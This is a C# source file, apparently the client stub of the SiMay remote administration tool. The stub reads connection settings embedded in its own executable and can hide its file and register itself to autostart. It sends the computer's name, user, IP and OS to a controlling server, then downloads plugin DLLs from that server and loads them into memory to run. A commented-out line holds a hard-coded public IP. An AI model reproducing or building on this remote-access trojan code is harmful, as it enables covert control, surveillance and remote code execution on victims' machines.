using SiMay.RemoteService.Entitys;
using SiMay.RemoteService.Interface;
using SiMay.Sockets.Tcp;
using SiMay.Sockets.Tcp.Client;
using SiMay.Sockets.Tcp.Session;
using SiMay.Sockets.Tcp.TcpConfiguration;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace SiMay.RemoteService
{
    class Program
    {
        private const byte CONNECT_MAIN = 0;
        private const byte CONNECT_WORK = 1;

        private const short S_GLOBAL_OK = 1;
        private const short C_GLOBAL_CONNECT = 1000;

        private const short S_MAIN_PLUGIN_FILES = 1014;

        private const short C_MAIN_LOGIN = 2000;
        //private const short C_MAIN_GET_PLUGIN_FILES = 2006;

        private const string MAIN_PLUGIN_COMNAME = "SiMayServiceCore.dll";
        private const string LOG_FILENAME = "SiMayRun.log";

        private static IAppMainService _appMainService;

        private static bool _hasloadPlugin;
        private static IPEndPoint _iPEndPoint;
        private static StartParameter _startParameter;
        private static TcpSocketSaeaClientAgent _clientAgent;
        private static Dictionary<string, byte[]> _pluginCOMs = new Dictionary<string, byte[]>();
        static void Main(string[] args)
        {
            _startParameter = new StartParameter()
            {
                Host = "127.0.0.1",
                Port = 5200,
                GroupName = "默认分组",
                RemarkInformation = "SiMayService远程管理",
                IsHide = false,
                IsMutex = false,
                IsAutoStart = false,
                SessionMode = 0,
                AccessKey = 5200,
                ServiceVersion = "正式5.0",
                RunTimeText = DateTime.Now.ToString(),
                UniqueId = "AAAAAAAAAAAAAAA11111111"
            };
            //_startParameter.Host = "94.191.115.121";
            byte[] binary = File.ReadAllBytes(Application.ExecutablePath);
            var sign = BitConverter.ToInt16(binary, binary.Length - sizeof(Int16));
            if (sign == 9999)
            {
                var length = BitConverter.ToInt32(binary, binary.Length - sizeof(Int16) - sizeof(Int32));
                byte[] bytes = new byte[length];
                Array.Copy(binary, binary.Length - sizeof(Int16) - sizeof(Int32) - length, bytes, 0, length);

                int index = 0;
                int id_len = BitConverter.ToInt32(bytes, index);
                index += sizeof(int);
                string id = Encoding.Unicode.GetString(bytes, index, id_len);
                index += id_len;
                int host_len = BitConverter.ToInt32(bytes, index);
                index += sizeof(int);
                string host = Encoding.Unicode.GetString(bytes, index, host_len);
                index += host_len;
                int port = BitConverter.ToInt32(bytes, index);
                index += sizeof(int);
                int des_len = BitConverter.ToInt32(bytes, index);
                index += sizeof(int);
                string des = Encoding.Unicode.GetString(bytes, index, des_len);
                index += des_len;
                int group_len = BitConverter.ToInt32(bytes, index);
                index += sizeof(int);
                string groupName = Encoding.Unicode.GetString(bytes, index, group_len);
                index += group_len;
                bool isHide = BitConverter.ToBoolean(bytes, index);
                index += sizeof(bool);
                bool isAutoStart = BitConverter.ToBoolean(bytes, index);
                index += sizeof(bool);
                int sessionMode = BitConverter.ToInt32(bytes, index);
                index += sizeof(int);
                int accessKey = BitConverter.ToInt32(bytes, index);
                index += sizeof(int);
                bool isMutex = BitConverter.ToBoolean(bytes, index);
                index += sizeof(bool);

                _startParameter.Host = host;
                _startParameter.Port = port;
                _startParameter.RemarkInformation = des;
                _startParameter.IsAutoStart = isAutoStart;
                _startParameter.IsHide = isHide;
                _startParameter.AccessKey = accessKey;
                _startParameter.SessionMode = sessionMode;
                _startParameter.UniqueId = id;
                _startParameter.IsMutex = isMutex;
                _startParameter.GroupName = groupName;
            }

            if (_startParameter.IsMutex)
            {
                //进程互斥体
                Mutex MyMutex = new Mutex(true, "SiMayService", out var bExist);
                if (!bExist)
                    Environment.Exit(0);
            }

            if (_startParameter.IsHide)
                CommonHelper.SetExecutingFileHide(true);

            if (_startParameter.IsAutoStart)
                CommonHelper.SetAutoRun(true);

            Application.SetUnhandledExceptionMode(UnhandledExceptionMode.CatchException);
            Application.ThreadException += Application_ThreadException;

            AppDomain.CurrentDomain.UnhandledException += CurrentDomain_UnhandledException;
            AppDomain.CurrentDomain.AssemblyResolve += (s, p) =>
            {
                var key = p.Name.Split(',')[0] + ".dll";
                var assembly = Assembly.Load(_pluginCOMs[key]);
                _pluginCOMs.Remove(key);
                return assembly;
            };

            var clientConfig = new TcpSocketSaeaClientConfiguration();
            if (_startParameter.SessionMode == 0)
            {
                //服务版配置
                clientConfig.AppKeepAlive = true;
                clientConfig.KeepAlive = false;
            }
            else
            {
                //中间服务器版服务端配置
                clientConfig.AppKeepAlive = false;
                clientConfig.KeepAlive = true;
            }
            clientConfig.KeepAliveInterval = 5000;
            clientConfig.KeepAliveSpanTime = 1000;
            _clientAgent = TcpSocketsFactory.CreateClientAgent(TcpSocketSaeaSessionType.Packet, clientConfig, Notify);
            while (true) //第一次解析域名,直至解析成功
            {
                var ip = CommonHelper.GetHostByName(_startParameter.Host);
                if (ip != null)
                {
                    _iPEndPoint = new IPEndPoint(IPAddress.Parse(ip), _startParameter.Port);
                    break;
                }

                Console.WriteLine(_startParameter.Host ?? "address analysis is null");

                Thread.Sleep(5000);
            }
            ConnectToServer();

            Application.Run();
        }


        private static void ConnectToServer()
        {
            ThreadPool.QueueUserWorkItem(x =>
            {
                var ip = CommonHelper.GetHostByName(_startParameter.Host);//尝试解析域名
                if (ip == null)
                    return;
                _iPEndPoint = new IPEndPoint(IPAddress.Parse(ip), _startParameter.Port);
            });
            _clientAgent.ConnectToServer(_iPEndPoint);
        }

        private static void Notify(TcpSocketCompletionNotify notify, TcpSocketSaeaSession session)
        {
            if (_appMainService != null)
            {
                //如果服务已加载
                _appMainService.Notify(notify, session);
                return;
            }

            switch (notify)
            {
                case TcpSocketCompletionNotify.OnConnected:
                    byte[] ack = BuilderAckPacket(_startParameter.AccessKey, CONNECT_MAIN);
                    MsgHelper.SendMessage(session, C_GLOBAL_CONNECT, ack);
                    break;
                case TcpSocketCompletionNotify.OnSend:
                    break;
                case TcpSocketCompletionNotify.OnDataReceiveing:
                    break;
                case TcpSocketCompletionNotify.OnDataReceived:
                    switch (MsgHelper.GetMessageHead(session.CompletedBuffer))
                    {
                        case S_GLOBAL_OK:
                            byte[] data = BuilerTempLoginPacket();
                            MsgHelper.SendMessage(session, C_MAIN_LOGIN, data);
                            break;
                        case S_MAIN_PLUGIN_FILES:
                            if (_hasloadPlugin)
                                return;
                            AnalysisLoadAssemblyCOM(session, MsgHelper.GetMessagePayload(session.CompletedBuffer));
                            break;
                        default:
                            break;
                    }
                    break;
                case TcpSocketCompletionNotify.OnClosed:

                    if (_hasloadPlugin)
                        return;

                    System.Timers.Timer resetTimer = new System.Timers.Timer();
                    resetTimer.Interval = 5000;
                    resetTimer.Elapsed += (s, e) =>
                    {
                        //主连接重连
                        ConnectToServer();

                        resetTimer.Stop();
                        resetTimer.Dispose();
                    };
                    resetTimer.Start();
                    break;
                default:
                    break;
            }
        }
        public static byte[] BuilderAckPacket(long accessKey, byte type)
        {
            byte[] ack = new byte[sizeof(long) + sizeof(byte)];
            BitConverter.GetBytes(accessKey).CopyTo(ack, 0);
            ack[ack.Length - 1] = type;

            return ack;
        }

        public static byte[] BuilerTempLoginPacket()
        {
            var builderLst = new List<byte>();

            BuilderAdd(builderLst, SystemInforUtil.LocalIPV4);
            BuilderAdd(builderLst, Environment.MachineName);

            string remarkInfomation = AppConfiguartion.RemarkInfomation ?? _startParameter.RemarkInformation;
            BuilderAdd(builderLst, remarkInfomation);

            var groupName = AppConfiguartion.GroupName ?? _startParameter.GroupName;
            BuilderAdd(builderLst, groupName);


            builderLst.AddRange(BitConverter.GetBytes(Environment.ProcessorCount));
            BuilderAdd(builderLst, SystemInforUtil.LocalCpuInfo);
            builderLst.AddRange(BitConverter.GetBytes(SystemInforUtil.LocalMemorySize));
            BuilderAdd(builderLst, _startParameter.RunTimeText);
            BuilderAdd(builderLst, _startParameter.ServiceVersion);
            BuilderAdd(builderLst, Environment.UserName);
            BuilderAdd(builderLst, SystemInforUtil.OSFullName);

            var isOpenScreenView = AppConfiguartion.IsOpenScreenView ?? "true";
            builderLst.Add((byte)(isOpenScreenView == "true" ? 1 : 0));
            builderLst.Add(0);
            builderLst.Add(0);
            builderLst.Add(0);

            BuilderAdd(builderLst, _startParameter.UniqueId);

            builderLst.Add(0);

            if (!int.TryParse(AppConfiguartion.ScreenRecordHeight, out int _screen_record_height))
                _screen_record_height = 800;

            builderLst.AddRange(BitConverter.GetBytes(_screen_record_height));

            if (!int.TryParse(AppConfiguartion.ScreenRecordWidth, out int _screen_record_width))
                _screen_record_width = 1200;

            builderLst.AddRange(BitConverter.GetBytes(_screen_record_width));

            if (!int.TryParse(AppConfiguartion.ScreenRecordSpanTime, out int _screen_record_spantime))
                _screen_record_spantime = 3000;
            builderLst.AddRange(BitConverter.GetBytes(_screen_record_spantime));

            builderLst.Add(0);//未加载插件标识位

            return builderLst.ToArray();
        }

        private static void BuilderAdd(List<byte> buffers, string text)
        {
            byte[] bytes = Encoding.Unicode.GetBytes(text);
            buffers.AddRange(BitConverter.GetBytes(bytes.Length));
            buffers.AddRange(bytes);
        }

        private static void AnalysisLoadAssemblyCOM(TcpSocketSaeaSession session, byte[] data)
        {
            int position = 0;
            var byteLst = new List<byte>(data);

            byte[] countBytes = byteLst.GetRange(position, sizeof(int)).ToArray();
            int count = BitConverter.ToInt32(countBytes, 0);

            position += sizeof(int);
            while (position < byteLst.Count)
            {
                int len = BitConverter.ToInt32(byteLst.GetRange(position, sizeof(int)).ToArray(), 0);
                position += sizeof(int);
                string name = Encoding.Unicode.GetString(byteLst.GetRange(position, len).ToArray(), 0, len);
                position += len;
                int fileLenght = BitConverter.ToInt32(byteLst.GetRange(position, sizeof(int)).ToArray(), 0);
                position += sizeof(int);
                byte[] file = byteLst.GetRange(position, fileLenght).ToArray();
                position += fileLenght;
                _pluginCOMs.Add(name, file);
            }

            if (_pluginCOMs.ContainsKey(MAIN_PLUGIN_COMNAME))
            {
                var assembly = Assembly.Load(_pluginCOMs[MAIN_PLUGIN_COMNAME]);
                var mainType = assembly.GetTypes().Where(c => typeof(IAppMainService).IsAssignableFrom(c)).FirstOrDefault();
                if (mainType == null)
                    throw new InvalidOperationException();

                _hasloadPlugin = true;

                _appMainService = Activator.CreateInstance(mainType, _startParameter, _clientAgent, session, _iPEndPoint) as IAppMainService;
            }
        }


        private static void Application_ThreadException(object sender, ThreadExceptionEventArgs e)
        {
            CommonHelper.WriteText(e.Exception, Path.Combine(Environment.CurrentDirectory, LOG_FILENAME));
        }

        private static void CurrentDomain_UnhandledException(object sender, UnhandledExceptionEventArgs e)
        {
            CommonHelper.WriteText(e.ExceptionObject as Exception, Path.Combine(Environment.CurrentDirectory, LOG_FILENAME));
        }
    }
}
